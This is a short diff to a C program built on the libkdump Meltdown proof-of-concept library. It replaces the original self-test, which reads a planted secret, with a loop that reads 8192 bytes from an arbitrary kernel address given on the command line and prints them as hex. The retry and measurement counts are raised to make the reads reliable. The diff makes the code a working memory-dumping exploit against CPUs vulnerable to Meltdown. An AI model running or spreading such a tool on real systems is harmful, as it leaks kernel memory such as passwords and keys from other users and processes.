@@ -6,24 +6,30 @@
 int main(int argc, char *argv[]) {
   size_t scratch[4096];
   libkdump_config_t config;
-  size_t offset = 0xffff880000000000ull;
   int progress = 0;
   unsigned char secret = 'X';
 
-  if(argc == 2) {
-    offset = strtoull(argv[1], NULL, 0);
-    printf("\x1b[33;1m[+]\x1b[0m Setting physical offset to 0x%zx\n", offset);
-  }
-  
   libkdump_enable_debug(0);
 
   config = libkdump_get_autoconfig();
-  config.retries = 10;
-  config.measurements = 2;
-  config.physical_offset = offset;
+  config.retries = 10000;
+  config.measurements = 8;
 
+	printf("tsx forced off\n");
+ printf("attempting to read from address %s\n", argv[1]);
+
+ uint64_t addr = strtoull(argv[1], NULL, 16);
   libkdump_init(config);
 
+  int i;
+	for (i = 0; i < 8192; i++) {
+		int byte = libkdump_read(addr + i);
+	(byte) ?  printf("%x", byte) : printf("xx");
+		fflush(stdout);
+	//	 printf("got byte %x for 0x%lx %s", byte, addr + i, byte ? "\n" : "- failed?\n");
+	}
+	printf("\n");
+#if 0
   size_t var = (size_t)(scratch + 2048);
   *(char*)var = secret;
 
@@ -58,6 +64,7 @@ int main(int argc, char *argv[]) {
     fflush(stdout);
     secret = (rand() % 255) + 1;
   }
+#endif
 
   libkdump_cleanup();
 
